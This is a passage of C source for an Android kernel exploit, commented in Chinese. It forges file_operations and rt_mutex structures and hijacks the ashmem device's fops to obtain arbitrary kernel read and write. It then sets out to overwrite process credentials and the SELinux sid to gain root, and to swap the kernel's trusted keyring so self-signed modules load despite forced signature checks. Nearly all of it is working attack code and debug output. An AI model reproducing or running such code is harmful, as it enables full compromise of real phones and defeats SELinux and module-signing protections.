        if (dup2(src, f) < 0) { fprintf(stderr, "[!] dup2(%d,%d) errno=%d\n", src, f, errno); return -1; }
        if (use_we) nwe++; else nre++;
        n++;
    }
    int hf = fcntl(we, F_DUPFD, 400);          /* 抬高 fdt->max_fds(>=512) => n 不会被截就*/
    fprintf(stderr, "[*] fd 并集武装: %d 个置位fd (写端 %d / 读端 %d) w=%d r=%d 抬max_fds fd=%d\n",
            n, nwe, nre, we, re, hf);
    return 0;
}

/* idx=0: F = 会file_operations 行; idx=1: G = 会struct rt_mutex 行*/
static void fops_table_build(uint64_t kb) {
    memset(g_tbl[0], 0, sizeof(g_tbl[0]));
    put64(g_tbl[0] + 0x00, 0);                                  /* .owner = NULL (try_module_get(NULL)=OK) */
    put64(g_tbl[0] + 0x08, 0);                                  /* .llseek (会被 store1 覆盖, 无所调 */
    /* ★★ 第三十四轮关键修正 .read 必须留0!
     * 本机 configfs_read_bin_file 的【序言】就无条件解引用 configfs 私有 dentry 字段:
     *     002acf98 ldr x8,[filp,#0x18]  ; f_path.dentry
     *     002acfac ldr x8,[x8,#0x78]    ; devtmpfs 的dentry 该字段为 0
     *     002acfb8 ldr x26,[x8,#0x58]   ; => 0x58 处缺页-> oops(真机 [f7] 正好死在这里)
     * (5.x 版把那步放进了条件执行的 fill_read_buffer, 所以官方能用。
     * 者configfs_write_bin_file 的序言干净(只取 private_data) => 只做任意写 用O_WRONLY 打开。     * 任意【读】后续用: 改写某个可读 sysctl 的ctl_table.data 指针 => cat /proc/... 即得 4 字节。*/
    put64(g_tbl[0] + 0x10, 0);                                  /* .read  = NULL (禁止证 阻oops) */
    put64(g_tbl[0] + 0x18, kb + OFF_CONFIGFS_WRITE_BIN_FILE);   /* ★.write = configfs_write_bin_file */
    put64(g_tbl[0] + 0x48, kb + OFF_ASHEMEM_IOCTL);             /* .unlocked_ioctl = ashmem_ioctl */
    put64(g_tbl[0] + 0x50, kb + OFF_COMPAT_ASHEMEM_IOCTL);      /* .compat_ioctl   = compat_ashmem_ioctl */
    put64(g_tbl[0] + 0x58, kb + OFF_ASHEMEM_MMAP);              /* .mmap   = ashmem_mmap */
    put64(g_tbl[0] + 0x60, kb + OFF_ASHEMEM_OPEN);              /* ★.open  = ashmem_open (设private_data) */
    put64(g_tbl[0] + 0x70, kb + OFF_ASHEMEM_RELEASE);           /* .release = ashmem_release */
    /* ★★ ZT32 拆雷（FINDINGS ZT32 / ZT32.9）：filp_close() 在本机是
     *      ldr x8,[filp,#0x28]      ; x8 = filp->f_op
     *      ldr x8,[x8,#0x68]        ; x8 = f_op->flush   <-- .flush 在f_op+0x68
     *      cbz x8, skip ; blr x8    ; 返回地址 = filp_close+0x38
     *    而真机pstore 里的 oops 现场 lr 恰好是filp_close+0x38 ⇒崩的就是这一调。     *    我们的伪表活在【载波线程select 的内核栈】上，内核只把FDS_BYTES(select_n)
     *    个字节从本缓冲区拷上栈，之后的槽是【栈上残留】——     *    于是 .flush@0x68 拿到过一个真实返回地址(__schedule+0x6f8)）     *    任何 close()/execve()/进程退出都会blr 实⇒NULL 解引用⇒panic。     *    这里显式清零。★ 只碰超出 fd_set 位图的槽）poll@0x40 很可能仍落在位图里     *    (改它等于改载波的 select 布防)，坚决不动。*/
    put64(g_tbl[0] + 0x68, 0);                                  /* .flush  <- 就是它害的*/
    put64(g_tbl[0] + 0x78, 0);                                  /* .fsync  */
    put64(g_tbl[0] + 0x80, 0);                                  /* .fasync */
    fprintf(stderr, "[*] 会fops 行@F=0x%llx: read=NULL write=0x%llx ioctl=0x%llx open=0x%llx\n",
            (unsigned long long)g_region[0],
            (unsigned long long)(kb + OFF_CONFIGFS_WRITE_BIN_FILE),
            (unsigned long long)(kb + OFF_ASHEMEM_IOCTL),
            (unsigned long long)(kb + OFF_ASHEMEM_OPEN));

    /* ★★ G = 会struct rt_mutex, 完全在【另一个】载波栈区里, 不W 的字段零重叠:
     *   G+0x00 = 0        : L->wait_lock              (trylock 必须成功, 且不会被人重写
     *   G+0x08 = 0        : L->waiters.rb_node
     *   G+0x10 = P        : L->waiters.rb_leftmost    (BUG_ON 用rt_mutex_top_waiter(L) = P)
     *   G+0x18 = &init_task : L->owner                (必须真task)
     *   P = G+0x28        : => P+0x38 = G+0x60, 们*(u64*)(G+0x60) = G 即满足BUG_ON
     *                       (P+0x40 = G+0x68 = 证waiter"的prio, 塞0) */
    uint64_t G = g_region[1];
    uint64_t P = G + 0x28;
    memset(g_tbl[1], 0, sizeof(g_tbl[1]));
    put64(g_tbl[1] + 0x00, 0);            /* L->wait_lock = 0 */
    put64(g_tbl[1] + 0x08, 0);            /* L->waiters.rb_node = 0 */
    put64(g_tbl[1] + 0x10, P);            /* L->waiters.rb_leftmost = P */
    put64(g_tbl[1] + 0x18, g_init_task);  /* L->owner = &init_task */
    put64(g_tbl[1] + 0x60, G);            /* *(u64*)(P+0x38) = L  => BUG_ON 通过 */
    put64(g_tbl[1] + 0x68, 0);            /* *(u32*)(P+0x40) = 0  => top waiter prio */
    fprintf(stderr, "[*] 会lock L=G=0x%llx  P=0x%llx  L->wait_lock=0  L->owner=0x%llx\n",
            (unsigned long long)G, (unsigned long long)P, (unsigned long long)g_init_task);
}

/* 官方 try_set_ashmem_name_blob 的忠实移植
 * ashmem_set_name 走strncpy_from_user(256) + strcpy(asma->name+11, ..) => NUL 截断、尾部不动
 * 因此可以用从后往前逐个 0 位置回填"的办法写进任意字节后0)。*/
static int ashmem_set_name_blob(int fd, const uint8_t *blob, int len) {
    char name[256];
    int i, j, passes = 0;
    static int dbg = 0;
    int verbose = (dbg++ < 6);
    memset(name, 0x41, sizeof(name));
    for (i = 0; i < len; i++) name[i] = blob[i] ? (char)blob[i] : 1;
    name[len] = 0;
    errno = 0;
    int r0 = ioctl(fd, ASHMEM_SET_NAME, name);
    int e0 = errno;
    if (verbose || r0 != 0)
        fprintf(stderr, "[*]     SET_NAME pass#0 len=%d -> %d errno=%d\n", len, r0, e0);
    if (r0 != 0) { errno = e0; return -1; }
    passes++;
    for (i = len; i > 0; i--) {
        if (blob[i - 1] != 0) continue;
        memset(name, 0x41, sizeof(name));
        for (j = 0; j < i - 1; j++) name[j] = blob[j] ? (char)blob[j] : 1;
        name[i - 1] = 0;
        errno = 0;
        int r = ioctl(fd, ASHMEM_SET_NAME, name);
        int e = errno;
        if (r != 0) {
            fprintf(stderr, "[!]     SET_NAME pass#%d pos=%d -> %d errno=%d\n", passes, i - 1, r, e);
            errno = e; return -1;
        }
        passes++;
    }
    if (verbose) fprintf(stderr, "[*]     SET_NAME 完成: 全%d 次ioctl\n", passes);
    return 0;
}

/* 把ashmem_area(=private_data, 被当作configfs_buffer) 的关键字段设好
 *   mutex.owner(0x20)=0 / needs_read_fill(0x48)=0 / read_in_progress(0x4c)=0 /
 *   write_in_progress(0x4d)=0 / bin_buffer(0x50)=target / bin_buffer_size(0x58)=len / cb_max_size(0x5c)=0
 *
 * ★第三十五轮两处优化
 *   (a) 本机 ashmem_set_name 会取【全局 ashmem_mutex。0xcc7e6c: mutex_lock_interruptible),
 *       者blob 每多一个0 字节就要多一次ioctl => 必须把零字节数压到最少。 *       blob 只覆盖字段0x0b..0x5f, 即blob 偏移 0x00..0x54; 长度可0x56 即可,
 *       并把 0x00..0x14 (线name 前缀, 无字段 填成非零 0x41 => 零字节120 -> ~64。 *   (b) ★★ 写入路径 (configfs_write_bin_file) 既不 memset 也不检查write_in_progress,
 *       只按 bin_buffer_size 边界写=> 【读方向只需 arm 一次。 之后每读一次就是 *       一次pwrite(8 字节指针) + 一次sysctl read, 雷ioctl / 零全局锁。 *       这一条把任务遍历的27 万次抢锁降到 1 次。*/
static int g_read_armed = 0;              /* bin_buffer 是否已指向busy_read 条目的data 字段 */
static uint64_t g_kb_local = 0;
static ssize_t kern_write(int fd, uint64_t target, const void *in, size_t len); /* 前向声明 */

static int cfg_prep(int fd, uint64_t target, uint32_t size) {
    uint8_t blob[0x60];
    memset(blob, 0x41, sizeof(blob));                                /* 前缀非零, 省零填充 */
    memset(blob + (CFG_MUTEX_OFF - ASHMEM_PREFIX_LEN), 0, 0x56 - (CFG_MUTEX_OFF - ASHMEM_PREFIX_LEN));
    put64(blob + CFG_MUTEX_OFF - ASHMEM_PREFIX_LEN, 0);
    put64(blob + CFG_NEEDS_READ_FILL_OFF - ASHMEM_PREFIX_LEN, 0);
    put64(blob + CFG_BIN_BUFFER_OFF - ASHMEM_PREFIX_LEN, target);
    put64(blob + CFG_BIN_BUFFER_SIZE_OFF - ASHMEM_PREFIX_LEN, (uint64_t)size);
    return ashmem_set_name_blob(fd, blob, 0x56);
}

/* 设bin_buffer 指向 busy_read 的ctl_table.data 字段; 之后可直接连可pwrite(8B) */
static int cfg_arm_reads(int fd, uint64_t kb) {
    /* RMX3031移植修复: 本机busy_read用proc_dointvec_minmax, 读内核指针(负int32)会被clamp成0.
     * 先把proc_handler(+0x20)改成明文proc_dointvec(无clamp), 再做data重定向. */
    uint64_t ph = kb + OFF_PROC_DOINTVEC;
    if (kern_write(fd, kb + OFF_BUSY_READ_CTL_ENTRY + 0x20, &ph, 8) != 8) return -1;
    if (cfg_prep(fd, kb + OFF_BUSY_READ_CTL_ENTRY + 0x08, 8) != 0) return -1;
    g_read_armed = 1;
    g_kb_local = kb;
    return 0;
}

static ssize_t kern_write(int fd, uint64_t target, const void *in, size_t len) {
    g_read_armed = 0;                       /* bin_buffer 被改指别处*/
    if (cfg_prep(fd, target, (uint32_t)len) != 0) return -1;
    errno = 0;
    return pwrite(fd, in, len, 0);
}

/* ★第三十四轮新构造 pc = value(=F), child = target(= &ashmem_misc.fops)
 *   store1: *(u64*)(value+8) = target      <- 毁value+8 (= .llseek 槽 无害)
 *   store2: *(u64*)(target)  = value       <- ★任意写 * 与旧 build_autowrite_buf 的区分 旧版 pc = target-8 / child = value,
 * 副作用落地*(u64*)(value+0)(= 伪表 .owner 槽 => 装不上伪表。*/
static void build_fops_write_buf(uint64_t target, uint64_t value) {
    uint64_t R = g_R, B = R - 0x18;
    uint64_t G = g_region[1];          /* ★伪lock 在【第二个载波栈区。 不W 零重可*/
    memset(g_buf, 0, STRADDLE_FILL);
    put64(g_buf + 0x00, 0);
    put64(g_buf + 0x08, 0);
    put64(g_buf + 0x10, 0);
    put64(g_buf + 0x18, value);        /* ★[站点甲] W.tree_entry.pc = pc = F  (!= node, 非RB_EMPTY) */
    put64(g_buf + 0x20, target);       /* ★[站点甲] W.tree_entry.rb_right = child = TARGET */
    put64(g_buf + 0x28, 0);            /* [站点甲] W.tree_entry.rb_left = 0 -> 走Case 1 */
    put64(g_buf + 0x30, R + 0x18);     /* [站点乙] pi_tree_entry.pc = node => RB_EMPTY => 跳过 pi erase */
    put64(g_buf + 0x38, 0);
    put64(g_buf + 0x40, 0);
    put64(g_buf + 0x48, g_init_task);  /* W.task */
    put64(g_buf + 0x50, G);            /* ★W.lock = G */
    put64(g_buf + 0x58, 0);            /* W.prio = 0  (不再与任何lock 字段重叠) */
    put64(g_buf + 0x60, 0);            /* W.deadline = 0 */
    put64(g_buf + 0x68, 0);
    put64(g_buf + 0x70, 0);
    fprintf(stderr, "[*] FOPS 写缓冲 B=0x%llx R=0x%llx G(W.lock)=0x%llx F=0x%llx\n",
            (unsigned long long)B, (unsigned long long)R, (unsigned long long)G,
            (unsigned long long)value);
    fprintf(stderr, "[*]   store1: *(u64*)(0x%llx) = 0x%llx   (毁.llseek 槽\n",
            (unsigned long long)(value + 8), (unsigned long long)target);
    fprintf(stderr, "[*]   store2: *(u64*)(0x%llx) = 0x%llx   ★★ 期望落地\n",
            (unsigned long long)target, (unsigned long long)value);
    fprintf(stderr, "[*]   前提: *(u64*)(0x%llx)(=.read槽 = 0x%llx != node=0x%llx\n",
            (unsigned long long)(value + 0x10),
            (unsigned long long)*(uint64_t *)(g_tbl[0] + 0x10),
            (unsigned long long)R);
}

/* ★第三十四轮 /dev/ashmem 的SELinux 标签是ashmem_device, u:r:shell:s0 【打不开。 *   (实测 open -> EACCES errno=13)。但同一次boot 里存在【同 rdev(10:58)】的别名节点
 *   /dev/ashmem<uuid>, 标签是ashmem_libcutils_device, 实测 OPEN-OK。 *   后rdev => misc_open 挂minor 查到的仍是同一个ashmem_misc => 劫持目标完全不变。 *   (官方 exploit 的init_ashmem_path/try_cache_ashmem_path + same_rdev_path 正是干这个。 */
static int find_ashmem_fd(char *outpath, size_t outlen) {
    struct stat ref;
    unsigned refdev;
    if (stat("/dev/ashmem", &ref) == 0 && S_ISCHR(ref.st_mode)) {
        refdev = (unsigned)ref.st_rdev;
        fprintf(stderr, "[*] ashmem 参考节点rdev = %u:%u\n",
                (unsigned)major(ref.st_rdev), (unsigned)minor(ref.st_rdev));
    } else {
        refdev = (unsigned)makedev(10, 58);
        fprintf(stderr, "[*] /dev/ashmem 不存在 回退用rdev=10:58\n");
    }
    DIR *d = opendir("/dev");
    if (!d) { perror("opendir /dev"); return -1; }
    struct dirent *e;
    int fd = -1;
    while ((e = readdir(d)) != NULL) {
        if (strncmp(e->d_name, "ashmem", 6) != 0) continue;
        char p[320];
        snprintf(p, sizeof(p), "/dev/%s", e->d_name);
        struct stat st;
        if (stat(p, &st) != 0 || !S_ISCHR(st.st_mode)) continue;
        if ((unsigned)st.st_rdev != refdev) continue;
        errno = 0;
        int t = open(p, O_WRONLY | O_CLOEXEC);   /* ★伪表没有 .read => 只能 O_WRONLY */
        fprintf(stderr, "[*]   证%s -> fd=%d errno=%d\n", p, t, errno);
        if (t >= 0) { fd = t; if (outpath) snprintf(outpath, outlen, "%s", p); break; }
    }
    closedir(d);
    return fd;
}


/* ★★ 任意内核【读。 本机 configfs_read_bin_file 的序言就无条件解引用configfs 私有 dentry 字段
 * (002acf98 ldr x8,[filp,#0x18] -> 002acfac ldr x8,[x8,#0x78] -> 002acfb8 ldr x26,[x8,#0x58];
 *  devtmpfs 的dentry 该字段为 0 => 在0x58 处缺页oops), 所以不能把 .read 指向它。 * 改用【用任意写改 ctl_table.data 指针】的办法: 把一个可读sysctl 条目的data 指针改成目标地址,
 * 之后 cat /proc/sys/... 就返回*(u32*)目标地址 (proc_dointvec_minmax 读取侧不钳制)。每次4 字节。 * ★第三十五轮优化 触cfg_arm_reads ——arm 一次后可连可 不再每次抢全局 ashmem_mutex。*/
static int kern_read4(int fd, uint64_t kb, uint64_t target, uint32_t *out) {
    uint64_t p = target;
    if (!g_read_armed || g_kb_local != kb) {
        if (cfg_arm_reads(fd, kb) != 0) return -1;
    }
    if (pwrite(fd, &p, 8, 0) != 8) return -1;
    errno = 0;
    long v = read_sysctl_int("/proc/sys/net/core/busy_read");
    *out = (uint32_t)v;
    return 0;
}

static int fops_hijack_verify(uint64_t kb, int *out_fd) {
    mark_stage("S5-chainwalk-returned-reached-verify");
    fprintf(stderr, "\n[*] ===== 验证阶段: 任意内核写+ 任意内核读via ctl_table.data 重定向 =====\n");
    char used[320] = {0};
    int fd = find_ashmem_fd(used, sizeof(used));
    if (fd < 0) { fprintf(stderr, "[!] 找不到可打开的ashmem 节点 -> 无法验证\n"); return -1; }
    if (out_fd) *out_fd = fd;
    fprintf(stderr, "[*]   使用 %s fd=%d (O_WRONLY)\n", used, fd);
    fprintf(stderr, "[*]   写之前busy_read=%ld\n", read_sysctl_int("/proc/sys/net/core/busy_read"));
    sync();

    /* =====================================================================
     * ★★★第三十五轮【关键安全修复。 立刻把ashmem_misc.fops 还原, 并修好伪表的 .llseek 槽     *
     * 为什么必须马上做:
     *   1) 我们这台机器真实的ashmem_fops 表是 .read=NULL。write=NULL。     *      .read_iter=ashmem_read; 而伪表把 .write 换成了configfs_write_bin_file
     *      => 任何【别的进程】对 ashmem fd 调write(), 都会拿它自己的ashmem_area 当     *         configfs_buffer 用 bin_buffer/bin_buffer_size 全是 name 里的垃圾
     *         => 野写, 把内核结构写块很可能就是把 ashmem_mutex 写坏);
     *   2) 写入原语的第一条store 会把 F+8(= .llseek 槽 砸成一个.data 地址
     *      => 任何进程对ashmem fd 调lseek() 都会跳到数据段执行NX) -> oops/panic。     * 还原后 全世界拿到的是真 ashmem_fops, 系统完全干净; 而【我们已经开好的这个 fd
     * 在open 时就把file->f_op 固定成了伪表 F。 所以它继续是我们专用的任意读写句柄。     * 伪表 F 位于载波线程的内核栈上 只要该线程还活着就一直有效。     * ===================================================================== */
    if (!opt_no_fops_restore) {
        uint64_t f_real = kb + OFF_ASHEMEM_FOPS;
        uint64_t llseek = kb + OFF_ASHEMEM_LLSEEK;
        errno = 0;
        ssize_t rl = kern_write(fd, g_region[0] + 8, &llseek, 8);
        fprintf(stderr, "[*]   修.llseek 槽 *((u64*)F+8) = 0x%llx -> %zd errno=%d\n",
                (unsigned long long)llseek, rl, errno);
        errno = 0;
        ssize_t rf = kern_write(fd, g_ashmem_fops_slot, &f_real, 8);
        fprintf(stderr, "[*]   ★还原 ashmem_misc.fops = 0x%llx (真ashmem_fops) -> %zd errno=%d\n",
                (unsigned long long)f_real, rf, errno);
        sync();
        /* 立刻读回自证: 这一步同时证明任意写和任意读都真的落地了 */
        uint32_t lo2 = 0, hi2 = 0;
        kern_read4(fd, kb, g_ashmem_fops_slot, &lo2);
        kern_read4(fd, kb, g_ashmem_fops_slot + 4, &hi2);
        uint64_t back = ((uint64_t)hi2 << 32) | (uint64_t)lo2;
        fprintf(stderr, "[*]   读回 ashmem_misc.fops = 0x%016llx  %s\n",
                (unsigned long long)back,
                back == f_real ? "★★★ 任意写任意读双双落地 且系统已还原干净"
                               : "(!) 不匹配");
        sync();
    }

    /* ---------------- 任意写---------------- */
    static uint32_t magic = 0x41424344u;
    fprintf(stderr, "[*]   任意写测试 kern_write(busy_read = 0x%x) ...\n", (int)magic);
    sync();
    errno = 0;
    ssize_t wm = kern_write(fd, kb + OFF_SYSCTL_NET_BUSY_READ, &magic, 4);
    fprintf(stderr, "[*]   kern_write -> %zd errno=%d\n", wm, errno);
    sync();
    /* 注意: busy_read 这个"可读 sysctl"的ctl_table.data 此刻可能还被上一次任意读
     * 指着别处, 所以读回前必须把data 指针还原成busy_read 自己 */
    if (cfg_arm_reads(fd, kb) == 0) {
        uint64_t self = kb + OFF_SYSCTL_NET_BUSY_READ;
        pwrite(fd, &self, 8, 0);
    }
    long after = read_sysctl_int("/proc/sys/net/core/busy_read");
    fprintf(stderr, "[*]   写之后busy_read=%ld  (期望 %d) %s\n", after, (int)magic,
            after == (long)(int)magic ? "★ 任意写命中" : "(!) 未命中");
    if (after == (long)(int)magic) mark_stage("S6-ARBITRARY-WRITE-LANDED");
    sync();

    /* ---------------- 任意读 读回 ashmem_misc.fops 不ashmem_misc.name ---------------- */
    uint32_t lo = 0, hi = 0;
    int r1 = kern_read4(fd, kb, g_ashmem_fops_slot, &lo);
    int r2 = kern_read4(fd, kb, g_ashmem_fops_slot + 4, &hi);
    uint64_t got = ((uint64_t)hi << 32) | (uint64_t)lo;
    uint64_t want = opt_no_fops_restore ? g_region[0] : (kb + OFF_ASHEMEM_FOPS);
    fprintf(stderr, "[*]   [任意读] r1=%d r2=%d  *(u64*)(0x%llx) = 0x%016llx  (期望 0x%llx)\n",
            r1, r2, (unsigned long long)g_ashmem_fops_slot,
            (unsigned long long)got, (unsigned long long)want);
    if (got == want) {
        fprintf(stderr, "[*]   ★★★完全命中! 任意内核【读 + 写】全部到手——提权只是时间问题\n");
    } else {
        fprintf(stderr, "[!]   读回值不符-> 写未落地 或读重定向失败\n");
    }
    /* 交叉: 证ashmem_misc.name 指针, 应指向.rodata 的\"ashmem\" 字符串*/
    uint32_t nlo = 0, nhi = 0;
    kern_read4(fd, kb, g_ashmem_fops_slot - 0x10 + 0x08, &nlo);
    kern_read4(fd, kb, g_ashmem_fops_slot - 0x10 + 0x0c, &nhi);
    fprintf(stderr, "[*]   [交叉] ashmem_misc.name = 0x%08x%08x (期望指向 KB 区内的\"ashmem\" 不\n", nhi, nlo);

    /* ---------------- 收尾还原 ---------------- */
    uint64_t orig_data = kb + OFF_SYSCTL_NET_BUSY_READ;
    kern_write(fd, kb + OFF_BUSY_READ_CTL_ENTRY + 0x08, &orig_data, 8);
    uint32_t z = 0;
    kern_write(fd, kb + OFF_SYSCTL_NET_BUSY_READ, &z, 4);
    fprintf(stderr, "[*]   已还原busy_read 的data 指针与值\n");
    sync();
    return 0;
}
/* ============================================================================
 * ★★★第三十五轮——最后一步 改cred 拆root
 *
 * 需要的本机偏移(纯离线自证 触FINDINGS.md ZH18):
 *   task->tasks 0x550 / task->real_cred 0x7f8 / task->cred 0x800 / task->comm 0x808
 *   cred->security 0x78   (指向 24 字节 task_security_struct: osid@0 sid@4)
 *   struct cred: usage 0x00 | uid 0x04 gid 0x08 suid 0x0c sgid 0x10
 *                euid 0x14 egid 0x18 fsuid 0x1c fsgid 0x20 | securebits 0x24
 *                cap_inheritable 0x28 cap_permitted 0x30 cap_effective 0x38
 *                cap_bset 0x40 cap_ambient 0x48   (kernel_cap_t = 8 字节)
 *
 * 策略: 【就地改 cred 对象本身。不动 task->cred / real_cred 指针)
 *   => real_cred 不cred 指向同一对象, 一次改动两边同时生效 且无需再写指针。 *   SELinux: 把cred->security 里的 osid/sid 都写成1 (SECINITSID_KERNEL)
 *   => current_sid() 变成 kernel, 一到avc_has_perm 视为内核域 全放行。 * ==========================================================================*/
#define TASK_TASKS_OFF      0x510ULL
#define TASK_REAL_CRED_OFF  0x7d0ULL
#define TASK_CRED_OFF       0x7d8ULL
#define TASK_COMM_OFF       0x7e0ULL

/* ★★ ZT51: fd 表遍历所需的偏移
 * 全部由【反汇编本机 boot_f26.Image 的exit_files / put_files_struct】读出
 * 不是猜的 (all_syms.txt: exit_files=_text+0x22bf40, put_files_struct=_text+0x22bde0):
 *   exit_files         +0x10: ldr x19, [x0, #0x840]        ; files = tsk->files
 *   put_files_struct   +0x30: ldr x20, [x0, #0x20]        ; fdt   = files->fdt
 *                      +0x38: ldr w8,  [x20]              ; max_fds
 *                      +0x60: ldr x9,  [x20, #0x18]       ; open_fds
 *                      +0x84: ldr x9,  [x20, #0x8]        ; fd
 *                      +0x94: ldxr x0, [x9, ...]          ; file = fd[bit]
 *                      +0xac: bl filp_close               ; ★一oops 的put_files_struct+0xb0 逐字节吻合 *   filp_close         +0x18: ldr x8, [x0, #0x28]         ; file->f_op
 */
#define TASK_FILES_OFF      0x800ULL
#define FILES_FDT_OFF       0x20ULL
#define FDT_MAX_FDS_OFF     0x00ULL
#define FDT_FD_OFF          0x08ULL
#define FDT_OPEN_FDS_OFF    0x18ULL
#define FILE_FOP_OFF        0x28ULL

/* ★★★ZT52: PI 链的钥匙 ——由反汇编 _text+0x13a9f8 (rt_mutex_adjust_prio_chain) 读出:
 *   +0x60: add x26, x19, #0x8dc    ; &task->pi_lock
 *   +0x6c: ldr x25, [x19, #0x900]  ; waiter = task->pi_blocked_on   ★★
 *   +0x70: cbz x25, <exit>         ; ★★★pi_blocked_on == 0 => 函数立即返回
 *   +0x88: ldr x8,  [x25, #0x38]   ; waiter->lock @ 0x38 (不WAITER_LOCK=7*8 一致
 * ⇒把那个被破坏的waiter 任务的pi_blocked_on 内0, 就能让这条走不完的PI 链 *   在【下一步】就终止. 这是软重启真正的第二颗雷 (第一题filp_close 已由 ZT51 修掉). */
#define TASK_PI_LOCK_OFF       0x8a4ULL
#define TASK_PI_BLOCKED_ON_OFF 0x8c8ULL
/* "stage1" 的前 6 个字节 (小端) —— 线程 comm 只能比这 6 字节, 见 gl_clear_pi_blocked_on */
#define GL_COMM6_STAGE1        0x0000316567617473ULL

/* ★★ ZT51: 自身 comm 的副本 get_root() 在主线程重prctl(PR_SET_NAME,"gLk<pid>"),
 * 但守护线程的 comm 是"stage1", 所以!fixfops 必须用【主线程那份名字】去认领 task. */
static char g_self_comm[16];
static int  g_fixfops_done;      /* ZT51: file->f_op 是否已全部改回真表*/
#define GL_STAGE1_BUILD "ZT52"
#define CRED_SECURITY_OFF   0x78ULL
#define CRED_CAP_EFF_OFF    0x38ULL
#define SECINITSID_KERNEL   1u

#define NR_setuid32         213            /* ARM EABI, 白名单内 */
#define NR_setgid32         214            /* ARM EABI, 白名单内 */
#define NR_setresuid32      208
#define NR_setresgid32      210

/* 连续证8 字节(两次 4 字节重定向*/
static int kern_read8(int fd, uint64_t kb, uint64_t target, uint64_t *out) {
    uint32_t lo = 0, hi = 0;
    if (kern_read4(fd, kb, target, &lo) != 0) return -1;
    if (kern_read4(fd, kb, target + 4, &hi) != 0) return -1;
    *out = ((uint64_t)hi << 32) | (uint64_t)lo;
    return 0;
}

/* 收尾还原 sysctl_net_busy_read 的ctl_table.data 指针与它自身的值*/
static int busy_read_restore(int fd, uint64_t kb) {
    uint64_t orig_data = kb + OFF_SYSCTL_NET_BUSY_READ;
    uint32_t z = 0;
    if (kern_write(fd, kb + OFF_BUSY_READ_CTL_ENTRY + 0x08, &orig_data, 8) != 8) return -1;
    if (kern_write(fd, kb + OFF_SYSCTL_NET_BUSY_READ, &z, 4) != 4) return -1;
    return 0;
}

static void get_root_proof(void) {
    fprintf(stderr, "[*]   >>> getuid=%d geteuid=%d getgid=%d getegid=%d\n",
            (int)getuid(), (int)geteuid(), (int)getgid(), (int)getegid());

    FILE *f = fopen("/proc/self/attr/current", "r");
    if (f) {
        char b[160] = {0};
        if (fgets(b, sizeof(b) - 1, f)) {
            b[strcspn(b, "\r\n")] = 0;
            fprintf(stderr, "[*]   >>> /proc/self/attr/current = \"%s\"\n", b);
        }
        fclose(f);
    }
    f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line) - 1, f)) {
            if (!strncmp(line, "CapEff:", 7) || !strncmp(line, "CapPrm:", 7) ||
                !strncmp(line, "CapBnd:", 7))
                fprintf(stderr, "[*]   >>> %s", line);
        }
        fclose(f);
    }
    /* 只有 root 能写 (0644 root:root) ——写回同样的值 无副作用 */
    int kp = open("/proc/sys/kernel/kptr_restrict", O_RDWR);
    fprintf(stderr, "[*]   >>> open(/proc/sys/kernel/kptr_restrict, O_RDWR) = %d errno=%d %s\n",
            kp, errno, kp >= 0 ? "★ root 才能写" : "");
    if (kp >= 0) {
        char cur[16] = {0};
        if (read(kp, cur, sizeof(cur) - 1) > 0) {
            lseek(kp, 0, SEEK_SET);
            ssize_t w = write(kp, cur, strlen(cur));
            fprintf(stderr, "[*]   >>>   回写 \"%s\" -> %zd\n", cur, w);
        }
        close(kp);
    }
    errno = 0;
    if (geteuid() == 0) {
        if (setresgid(0, 0, 0) == 0 && setresuid(0, 0, 0) == 0)
            fprintf(stderr, "[*]   >>> setresuid(0,0,0)+setresgid(0,0,0) 成功 ★\n");
        else
            fprintf(stderr, "[!]   >>> setresuid/setresgid 失败 errno=%d\n", errno);
    } else {
        fprintf(stderr, "[!]   >>> euid != 0 ——提权未生效\n");
    }
    sync();
}

/* ============================================================================
 * ★★★第三十六轮· 路线 B 最小验证+ 落地：模块签名闸门(CONFIG_MODULE_SIG_FORCE=y)
 *
 * 本轮【静态确认】的事实 (反汇编out/boot_f26.elf)） *   1) load_module 重module_sig_check 被内联 逻辑一
 *        if (!memcmp(hdr+len-28, "~Module signature appended~", 28)) {
 *            info->len -= 28; err = mod_verify_sig(mod, info);
 *            if (!err) { info->sig_ok = 1; ...继续... }
 *            return err;                       // ★验签失败 -> 直接返回原始 errno
 *        }
 *        return -ENODATA;                       // 没有签名标记 -> 同样直接失败
 *      => 全内核【没有】sig_enforce 变量 (符号表里这t 符号都没有 被常量折可,
 *         也没有"if (!sig_enforce) return 0" 这条放行分支。 *         【签名是硬闸门 翻某个bool 关不掉】。 *   2) 位verify_pkcs7_signature 只看一个全局指针:
 *        builtin_trusted_keys = _text + 0x2233890  (符号 ffffff800a78bdc8 t)
 *      它落地.bss (0x26D7810..0x36D7810) => 【可写】。 *   3) 者我们自己钥匙环的内核指针"根本不用猜 它就在cred + 0x58 (session_keyring)。 *
 * 于是路线 B 的形状
 *   ②用户态合法API: keyctl(JOIN_SESSION_KEYRING) + add_key("asymmetric", <自签 DER>)
 *   ②读cred+0x58 取回该钥匙环的内核指针(自证: 必须是合法内核堆地址)
 *   ②把该指针写进 builtin_trusted_keys  => 验签改看我们的钥匙环
 *   ②用对应私钥签 .ko, finit_module 即可加载
 *
 * 本轮先做【零编译】的端到端验证(用设备上现成的vendor 模块当试线:
 *   A. 原样 vendor .ko  -> 期望 EEXIST        (签名过 卡在"已加载)
 *   B. 改一字节的同文件 -> 期望 EKEYREJECTED  (证明签名真在生效)
 *   C. 交换 builtin_trusted_keys -> 内insmod A -> 若变成EKEYREJECTED
 *      => ★★ 证明"验签真的改看我们的钥匙环了, 亦即自签模块能过的充分条件已具备
 * ==========================================================================*/
#define OFF_BUILTIN_TRUSTED_KEYS 0x2233890ULL   /* certs/system_keyring.c: struct key *builtin_trusted_keys */

#ifndef __NR_add_key
#define __NR_add_key 309        /* ★ARM EABI 真值(不是 217!); <sys/syscall.h> 已定义时本行不生效*/
#endif
#ifndef __NR_keyctl
#define __NR_keyctl 311         /* ★ARM EABI 真值(不是 219!) */
#endif
#ifndef __NR_finit_module
#define __NR_finit_module 379   /* ★ARM EABI */
#endif
#ifndef __NR_syslog
#define __NR_syslog 103         /* ★ARM EABI */
#endif
#define KSU_SYSLOG_READ_ALL 3
#define KSU_KEYCTL_JOIN_SESSION_KEYRING 1
#define KSU_KEY_SPEC_SESSION_KEYRING (-3)
#define KSU_KPTR_MIN 0xffffff8000000000ULL

static int      opt_ksu_probe = 0;
static int      opt_alias_probe = 0;    /* ⚠️ 危险: 读猜测的 linear-map 别名 -> 未映射即重启 (ZI11).
                                         *    第三十六轮起默认关闭, 必须显式 --alias-probe */
static const char *opt_ksu_probe_der = NULL;
